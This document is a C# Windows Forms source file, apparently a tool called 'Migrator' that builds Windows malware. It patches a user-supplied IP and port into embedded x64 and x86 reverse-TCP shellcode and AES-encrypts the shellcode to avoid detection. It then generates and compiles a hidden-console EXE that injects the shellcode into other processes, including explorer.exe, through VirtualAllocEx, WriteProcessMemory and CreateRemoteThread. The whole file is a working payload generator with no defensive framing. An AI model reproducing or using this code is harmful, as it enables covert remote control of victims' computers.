using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
namespace Migrator
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
        byte[] IV;
        private void button1_Click(object sender, EventArgs e)
        {
            messages.Text = "RAMİN KARIMKHANI - http://www.piyadistramin.com" + Environment.NewLine;
            messages.Text += Environment.NewLine;
            int check;
            byte[] octet;
            if(int.TryParse(prt.Text,out check)==true)
            {
                octet = returnOctet(IP.Text, Convert.ToInt32(prt.Text), messages);
                if (octet != null)
                {
                    if (arch.SelectedIndex == 0)
                    {
                        
                        string shellcode = "0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x11,0x5c,0x0a,0x05,0x28,0xd9,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5";
                        var shCode = shellcode.Split(',');
                        byte[] shellCode = new byte[shCode.Length];
                        for(int i=0;i<shCode.Length;i++)
                        {
                            shellCode[i] = Convert.ToByte(shCode[i],16);
                        }
                        shellCode[246] = octet[0];
                        shellCode[247] = octet[1];
                        shellCode[248] = octet[2];
                        shellCode[249] = octet[3];
                        shellCode[244] = octet[4];
                        shellCode[245] = octet[5];
                        
                        string enc = AESEncrypt(shellCode,out IV);
                        string[] index = { "246", "247", "248", "249", "244", "245" };
                        string migrationCode = code(enc,index,"x64");
                        meterpreterBuilder("migratex64", migrationCode, messages, "x64");
                    }
                    else if (arch.SelectedIndex == 1)
                    {
                       
                        string shellcode = "0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x00,0x00,0x00,0x00,0x68,0x02,0x00,0x00,0x00,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3";
                        var shCode = shellcode.Split(',');
                        byte[] shellCode = new byte[shCode.Length];
                        for (int i = 0; i < shCode.Length; i++)
                        {
                            shellCode[i] = Convert.ToByte(shCode[i],16);
                        }
                        shellCode[176] = octet[0];
                        shellCode[177] = octet[1];
                        shellCode[178] = octet[2];
                        shellCode[179] = octet[3];
                        shellCode[183] = octet[4];
                        shellCode[184] = octet[5];
                       
                        string enc = AESEncrypt(shellCode,out IV);
                        string[] index = { "176", "177", "178", "179", "183", "184" };
                        string migrationCode = code(enc,index,"x86");
                        meterpreterBuilder("migratex86", migrationCode, messages, "x86");
                    }
                }
                else if (octet == null)
                {
                    messages.Text += "ERROR: IP address or PORT number not entered in the proper format." + Environment.NewLine;
                }
            } 
            else if (int.TryParse(prt.Text,out check) == false)
                messages.Text += "ERROR: IP address or PORT number not entered in the proper format." + Environment.NewLine;

        }

        public string AESEncrypt(byte[] secretMessage, out byte[] IV)
        {
            byte[] skey = new byte[32]
            {
               0xB3,0x74,0xA2,0x6A,0x71,0x49,0x04,0x37,0xAA,0x02,0x4E,0x4F,0xAD,0xD5,0xB4,0x97,0xFD,0xFF,0x1A,0x8E,0xA6,0xFF,0x12,0xF6,0xFB,0x65,0xAF,0x27,0x20,0xB5,0x9C,0xCF
            };
            
            Aes aes = new AesCryptoServiceProvider();
            aes.Key = skey;
            IV = aes.IV;

            MemoryStream ms = new MemoryStream();
            CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write);

            cs.Write(secretMessage, 0, secretMessage.Length);
            cs.Close();
            return Convert.ToBase64String(ms.ToArray());
        }
        public string code(string shCode,string[] indis,string arch)
        {
            string IniVec = IV[0].ToString();
            for (int i = 1; i < IV.Length; i++)
            {
                IniVec += "," + IV[i].ToString();
            }
            string archControl = "";

            if(arch == "x86")
            {
                archControl = "";
            }
            else
            if (arch == "x64")
            {
                archControl = "try" +
                                "{" +
                                    "bool checkArch;"+
                                    "bool checkIsWow64Process = IsWow64Process(migrate.Handle, out checkArch);" +
                                    "if (checkArch && checkIsWow64Process)" +
                                    "{" +
                                        "continue;" +
                                    "}" +
                                "}" +
                                "catch" +
                                "{" +
                                    "continue;" +
                                "};";
            }

            string codes = "using System;" +
                        "using System.Diagnostics;" +
                        "using System.Runtime.InteropServices;" +
                        "using System.Collections.Generic;" +
                        "using System.Linq;" +
                        "using System.Text;" +
                        "using System.Security.Cryptography;" +
                        "using System.IO;" +
                        "using System.Net.NetworkInformation;" +
                        "namespace migration" +
                        "{" +
                            "class Program" +
                            "{" +
                                "static void Main(string[] args)" +
                                "{" +

                                        "int SW_HIDE = 0;" +
                                        "IntPtr closeWindow = GetConsoleWindow();" +
                                        "ShowWindow(closeWindow, SW_HIDE);" +


                                        "string code =\""+shCode+"\";"+ 
                                        "byte[] byteShellCode = Decrypt(code);"+

                                            "var p = Process.GetProcesses();" +
                                            "int counter=0;"+
                                            "ProcessAccessFlags PROCESS_ALL_ACCESS = ProcessAccessFlags.All;" +
                                            "AllocationType MEM_COMMIT = AllocationType.Commit;" +
                                            "MemoryProtection PAGE_EXECUTE_READWRITE = MemoryProtection.ExecuteReadWrite;" +

                                            "foreach (Process migrate in p)"+
                                            "{"+

                                                "try"+
                                                "{"+
                                                     archControl+
                                                    "IntPtr handleProcess = OpenProcess(PROCESS_ALL_ACCESS, false, migrate.Id);"+
                                                   "if (handleProcess == IntPtr.Zero)"+
                                                    "{"+
                                                        "continue;"+
                                                    "}"+
                                                    "IntPtr allocatedMemory = VirtualAllocEx(handleProcess, IntPtr.Zero, (uint)byteShellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);"+
                                                    "if (allocatedMemory == IntPtr.Zero)"+
                                                    "{"+
                                                        "continue;"+
                                                    "}"+

                                                    "UIntPtr bytesWritten = UIntPtr.Zero;"+
                                                    "WriteProcessMemory(handleProcess, allocatedMemory, byteShellCode, (uint)byteShellCode.Length, out bytesWritten);"+

                                                    "uint iThreadId = 0;"+


                                                    "IntPtr hThread = CreateRemoteThread(handleProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, out iThreadId);"+
                                                    
                                                    "if (hThread == IntPtr.Zero)"+
                                                   "{"+
                                                       "continue;"+
                                                   "}"+
                                                   "else "+
                                                        "if (hThread != IntPtr.Zero)"+
                                                        "{"+
                                                            "counter++;"+
                                                            "break;"+
                                                        "}"+
                                                   
                                                "}"+
                                                "catch(Exception e)"+
                                                "{"+

                                                "}"+

                                            "}"+
                                    "if (counter==0)"+
                                     "{"+
                                                "int exp = Process.GetProcessesByName(\"explorer\")[0].Id;" +
                                                "IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, exp);" +
                                       
                                                "IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)byteShellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" +
                                       
                                                "UIntPtr bytWrt = UIntPtr.Zero;" +
                                                "WriteProcessMemory(hProcess, allocMem, byteShellCode, (uint)byteShellCode.Length, out bytWrt);" +

                                                "uint iThreadId = 0;" +
                                                "IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, out iThreadId);" +
                                               
                                                "Process.GetCurrentProcess().Close();" +
                                        "}"+
            
                                "}" +

                                "public static byte[] Decrypt(string enc)"+
                                "{"+
            
                                   " byte[] encMessage = Convert.FromBase64String(enc);"+
                                   " Aes aes = new AesCryptoServiceProvider();"+
                                    "byte[] skey = new byte[32]"+
                                    "{"+
                                       "0xB3,0x74,0xA2,0x6A,0x71,0x49,0x04,0x37,0xAA,0x02,0x4E,0x4F,0xAD,0xD5,0xB4,0x97,0xFD,0xFF,0x1A,0x8E,0xA6,0xFF,0x12,0xF6,0xFB,0x65,0xAF,0x27,0x20,0xB5,0x9C,0xCF"+
                                    "};"+
                                    "byte[] IV = new byte[16]"+
                                    "{"+
                                       IniVec+
                                    "};"+
                                    "aes.Key = skey;"+
                                    "aes.IV = IV;"+
                                    "MemoryStream ms = new MemoryStream();"+
                                    "CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write);"+
                                    "cs.Write(encMessage, 0, encMessage.Length);"+
                                    "cs.Close();"+
                                   "return ms.ToArray();"+
                                "}"+
                                "[DllImport(\"kernel32.dll\", SetLastError = true, CallingConvention = CallingConvention.Winapi)]"+
                                "[return: MarshalAs(UnmanagedType.Bool)]"+
                                "private static extern bool IsWow64Process([In] IntPtr process, [Out] out bool wow64Process);"+

                                "[DllImport(\"kernel32.dll\")]" +
                                "public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);" +

                                "[DllImport(\"kernel32.dll\")]" +
                                "public static extern bool CloseHandle(IntPtr hObject);" +

                                "[DllImport(\"kernel32.dll\")]" +
                                "public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);" +

                                "[DllImport(\"kernel32.dll\")]" +
                                "public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);" +

                                "[DllImport(\"kernel32.dll\")]" +
                                "public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);" +

                                "[DllImport(\"kernel32\")]" +
                                "static extern IntPtr GetConsoleWindow();" +
                                "[DllImport(\"user32.dll\")]" +
                                "static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);" +

                                "[Flags]" +
                                "public enum ProcessAccessFlags : uint" +
                                "{" +
                                    "Terminate = 0x00000001," +
                                    "CreateThread = 0x00000002," +
                                    "VMOperation = 0x00000008," +
                                    "VMRead = 0x00000010," +
                                    "VMWrite = 0x00000020," +
                                    "DupHandle = 0x00000040," +
                                    "SetInformation = 0x00000200," +
                                    "QueryInformation = 0x00000400," +
                                    "Synchronize = 0x00100000," +
                                    "All = 0x001F0FFF" +
                                "}" +

                                "[Flags]" +
                                "public enum AllocationType" +
                                "{" +
                                    "Commit = 0x1000," +
                                    "Reserve = 0x2000," +
                                    "Decommit = 0x4000," +
                                    "Release = 0x8000," +
                                    "Reset = 0x80000," +
                                    "Physical = 0x400000," +
                                    "TopDown = 0x100000," +
                                    "WriteWatch = 0x200000," +
                                    "LargePages = 0x20000000" +
                                "}" +

                                "[Flags]" +
                                "public enum MemoryProtection" +
                                "{" +
                                    "Execute = 0x10," +
                                    "ExecuteRead = 0x20," +
                                    "ExecuteReadWrite = 0x40," +
                                    "ExecuteWriteCopy = 0x80," +
                                    "NoAccess = 0x01," +
                                    "ReadOnly = 0x02," +
                                    "ReadWrite = 0x04," +
                                    "WriteCopy = 0x08," +
                                    "GuardModifierflag = 0x100," +
                                    "NoCacheModifierflag = 0x200," +
                                    "WriteCombineModifierflag = 0x400" +
                                "}" +

                            "}" +
                        "}";
            return codes;
        }
        public byte[] returnOctet(string IP, int port, TextBox t)
        {
            try
            {
                var IpSplit = IP.Split('.');
                byte[] octet = new byte[6];
                for (int i = 0; i < 4; i++)
                {
                    octet[i] = Convert.ToByte(IpSplit[i]);
                }

                if (port > 0 && port < 256)
                {
                    octet[4] = 0x00;
                    octet[5] = Convert.ToByte(port);
                }
                else if (port >= 256 && port < 65536)
                {
                    octet[4] = Convert.ToByte(port / 256);
                    octet[5] = Convert.ToByte(port - (port / 256) * 256);
                }
                return octet;
            }
            catch(Exception e)
            {
                t.Text += "HATA: IP adresi ya da PORT numarası uygun formatta girilmedi" + Environment.NewLine;
            }
            return null;
        }
        public void meterpreterBuilder(string name, string code, TextBox print, string arch)
        {
            try
            {
                string csName = "migrate";
                print.Text += "Creating EXE file ..." + Environment.NewLine;

                string exePath = Application.StartupPath + "\\" + name + ".exe";
                string csPath = Application.StartupPath + "\\" + csName + ".cs";
                if (File.Exists(csPath))
                {
                    File.Delete(csPath);
                    File.WriteAllText(csPath, code);
                }
                else
                {
                    File.WriteAllText(csPath, code);
                }
                Process pr = new Process();
                pr.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
                
                if (arch == "x86")
                {
                    pr.StartInfo.Arguments = " /c C:\\Windows\\Microsoft.NET\\Framework\\"+dotNetVersion("x86")+"\\csc.exe /unsafe /platform:" + arch + " /out:\"" + exePath + "\" \"" + csPath + "\"";
                }
                else
                {
                    pr.StartInfo.Arguments = " /c C:\\Windows\\Microsoft.NET\\Framework64\\" + dotNetVersion("x64") + "\\csc.exe /unsafe /platform:" + arch + " /out:\"" + exePath + "\" \"" + csPath + "\"";
                }
                pr.StartInfo.CreateNoWindow = true;
                pr.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                pr.StartInfo.UseShellExecute = false;
                pr.Start();
                pr.WaitForExit();
                print.Text += "File saved: " + exePath + "" + Environment.NewLine;
                File.Delete(csPath);
            }
            catch (Exception e)
            {
                print.Text += "Couldn't create EXE file. There was a problem." + Environment.NewLine;
                print.Text += e.ToString();
            }
        }
        public string dotNetVersion(string arch)
        {
            string path = "";
            if (arch == "x86")
            {
                path = "C:\\Windows\\Microsoft.NET\\Framework\\";
            }
            else
            {
                path = "C:\\Windows\\Microsoft.NET\\Framework64\\";
            }
            string[] dir = Directory.GetDirectories(path);
            string version = "";
            for (int i = 0; i < dir.Length; i++)
            {
                string[] versions = dir[i].Split('\\');
                if (versions[versions.Length - 1].StartsWith("v"))
                {
                    version = versions[versions.Length - 1];

                }
            }
            return version;
        }
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VMOperation = 0x00000008,
            VMRead = 0x00000010,
            VMWrite = 0x00000020,
            DupHandle = 0x00000040,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            Synchronize = 0x00100000,
            All = 0x001F0FFF
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            messages.Text = "RAMİN KARIMKHANI - http://www.piyadistramin.com"+Environment.NewLine;
            messages.Text += Environment.NewLine;
        }
    
    }
}


